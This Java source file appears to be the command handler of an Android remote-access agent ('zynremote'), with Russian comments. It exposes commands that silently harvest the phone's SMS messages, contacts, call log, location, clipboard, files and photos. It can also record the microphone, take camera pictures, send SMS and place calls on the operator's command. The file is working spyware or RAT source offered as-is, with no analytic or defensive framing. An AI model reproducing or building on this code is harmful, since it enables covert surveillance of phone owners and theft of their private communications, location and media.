package com.zynremote.agent;

import android.content.ClipboardManager;
import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import java.io.File;

public class Commands {

    public static String execute(Context ctx, String cmd) {
        try {
            // === БАЗОВЫЕ ===
            if (cmd.equals("/ping")) return "pong";
            if (cmd.equals("/info")) return DeviceInfo.getInfoJson(ctx);
            if (cmd.equals("/apps")) return getApps(ctx);

            // === ДАННЫЕ ===
            if (cmd.equals("/sms")) return getSms(ctx);
            if (cmd.equals("/sent_sms")) return getSentSms(ctx);
            if (cmd.equals("/contacts")) return getContacts(ctx);
            if (cmd.equals("/call_log")) return getCallLog(ctx);
            if (cmd.equals("/location")) return getLocation(ctx);
            if (cmd.equals("/clip")) return getClipboard(ctx);

            // === СИСТЕМА ===
            if (cmd.equals("/battery")) return DeviceInfo.getBattery(ctx);
            if (cmd.equals("/wifi")) return DeviceInfo.getWifi(ctx);
            if (cmd.equals("/sim")) return DeviceInfo.getSim(ctx);
            if (cmd.equals("/storage")) return DeviceInfo.getStorage();
            if (cmd.equals("/uptime")) return DeviceInfo.getUptime();
            if (cmd.equals("/network")) return DeviceInfo.getNetwork(ctx);

            // === ФАЙЛЫ ===
            if (cmd.equals("/files")) return FileHelper.listDir("/sdcard/");
            if (cmd.startsWith("/ls ")) return FileHelper.listDir(cmd.substring(4).trim());
            if (cmd.startsWith("/get ")) return FileHelper.getFile(cmd.substring(5).trim());
            if (cmd.startsWith("/find ")) return FileHelper.findFiles(cmd.substring(6).trim());
            if (cmd.equals("/screenshots")) return FileHelper.screenshotsZip();
            if (cmd.equals("/photos_send")) return FileHelper.photosZip(40, "photos");

            // === МЕДИА ===
            if (cmd.startsWith("/mic")) {
                int sec = 10;
                try {
                    String[] p = cmd.split(" ");
                    if (p.length > 1) sec = Integer.parseInt(p[1]);
                    if (sec > 60) sec = 60;
                } catch (Throwable t) {}
                return MediaHelper.recordMic(ctx, sec);
            }
            if (cmd.equals("/photo") || cmd.equals("/front")) return MediaHelper.takePhoto(ctx, true);
            if (cmd.equals("/back")) return MediaHelper.takePhoto(ctx, false);

            // === УПРАВЛЕНИЕ ===
            if (cmd.startsWith("/toast ")) return SystemHelper.showToast(ctx, cmd.substring(7));
            if (cmd.startsWith("/notify ")) return SystemHelper.showNotification(ctx, cmd.substring(8));
            if (cmd.startsWith("/vibrate")) {
                int sec = 2;
                try {
                    String[] p = cmd.split(" ");
                    if (p.length > 1) sec = Integer.parseInt(p[1]);
                    if (sec > 30) sec = 30;
                } catch (Throwable t) {}
                return SystemHelper.vibrate(ctx, sec);
            }
            if (cmd.equals("/lock")) return SystemHelper.lockScreen(ctx);
            if (cmd.startsWith("/open ")) return SystemHelper.openUrl(ctx, cmd.substring(6).trim());
            if (cmd.startsWith("/call ")) return SystemHelper.callNumber(ctx, cmd.substring(6).trim());
            if (cmd.startsWith("/sms_send ")) {
                String[] p = cmd.substring(10).split(" ", 2);
                if (p.length < 2) return "usage: /sms_send +380... text";
                return SystemHelper.sendSms(ctx, p[0], p[1]);
            }

            return "unknown: " + cmd;
        } catch (Throwable t) {
            return "error: " + t.getMessage();
        }
    }

    private static String getApps(Context ctx) {
        try {
            android.content.pm.PackageManager pm = ctx.getPackageManager();
            java.util.List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(0);
            StringBuilder sb = new StringBuilder();
            sb.append("Всего: ").append(apps.size()).append("\n\n");
            for (android.content.pm.ApplicationInfo ai : apps) {
                boolean sys = (ai.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
                sb.append(sys ? "[SYS] " : "[USR] ")
                  .append(pm.getApplicationLabel(ai).toString()).append(" -> ")
                  .append(ai.packageName).append("\n");
            }
            return sb.toString();
        } catch (Throwable t) {
            return "error apps: " + t.getMessage();
        }
    }

    private static String getSms(Context ctx) {
        try {
            Cursor c = ctx.getContentResolver().query(Telephony.Sms.CONTENT_URI,
                null, null, null, Telephony.Sms.DATE + " DESC LIMIT 30");
            if (c == null) return "no access";
            StringBuilder sb = new StringBuilder("Последние SMS:\n\n");
            int count = 0;
            while (c.moveToNext() && count < 30) {
                String addr = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                long date = c.getLong(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                sb.append("[").append(new java.util.Date(date)).append("]\n")
                  .append("From: ").append(addr).append("\n").append(body).append("\n---\n");
                count++;
            }
            c.close();
            return sb.toString();
        } catch (Throwable t) {
            return "error sms: " + t.getMessage();
        }
    }

    private static String getSentSms(Context ctx) {
        try {
            Cursor c = ctx.getContentResolver().query(Telephony.Sms.CONTENT_URI,
                null, Telephony.Sms.TYPE + "=2", null, Telephony.Sms.DATE + " DESC LIMIT 30");
            if (c == null) return "no access";
            StringBuilder sb = new StringBuilder("Отправленные SMS:\n\n");
            int count = 0;
            while (c.moveToNext() && count < 30) {
                String addr = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                sb.append(addr).append(": ").append(body).append("\n---\n");
                count++;
            }
            c.close();
            return sb.toString();
        } catch (Throwable t) {
            return "error: " + t.getMessage();
        }
    }

    private static String getContacts(Context ctx) {
        try {
            Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c == null) return "no access";
            StringBuilder sb = new StringBuilder();
            int count = 0;
            while (c.moveToNext() && count < 300) {
                String name = c.getString(c.getColumnIndexOrThrow(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = c.getString(c.getColumnIndexOrThrow(
                    ContactsContract.CommonDataKinds.Phone.NUMBER));
                sb.append(name).append(" : ").append(phone).append("\n");
                count++;
            }
            c.close();
            sb.insert(0, "Всего: " + count + "\n\n");
            return sb.toString();
        } catch (Throwable t) {
            return "error contacts: " + t.getMessage();
        }
    }

    private static String getCallLog(Context ctx) {
        try {
            Cursor c = ctx.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
            if (c == null) return "no access";
            StringBuilder sb = new StringBuilder("Звонки:\n\n");
            int count = 0;
            while (c.moveToNext() && count < 50) {
                String num = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                String name = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                int type = c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                long dur = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                long date = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DATE));
                String t = type == CallLog.Calls.INCOMING_TYPE ? "IN" :
                           type == CallLog.Calls.OUTGOING_TYPE ? "OUT" : "MISS";
                sb.append(t).append(" ").append(name != null ? name : num)
                  .append(" ").append(num).append(" ").append(dur).append("s ")
                  .append(new java.util.Date(date)).append("\n");
                count++;
            }
            c.close();
            sb.insert(0, "Всего: " + count + "\n\n");
            return sb.toString();
        } catch (Throwable t) {
            return "error call_log: " + t.getMessage();
        }
    }

    private static String getLocation(Context ctx) {
        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) return "no lm";
            Location loc = null;
            try { loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER); } catch (Throwable t) {}
            if (loc == null) try { loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER); } catch (Throwable t) {}
            if (loc == null) return "no location";
            return "Lat: " + loc.getLatitude() + "\nLon: " + loc.getLongitude()
                + "\nAccuracy: " + loc.getAccuracy() + " m\n"
                + "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
        } catch (Throwable t) {
            return "error: " + t.getMessage();
        }
    }

    private static String getClipboard(Context ctx) {
        try {
            ClipboardManager cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null || !cm.hasPrimaryClip()) return "empty";
            CharSequence text = cm.getPrimaryClip().getItemAt(0).coerceToText(ctx);
            return text == null ? "empty" : text.toString();
        } catch (Throwable t) {
            return "error: " + t.getMessage();
        }
    }
}
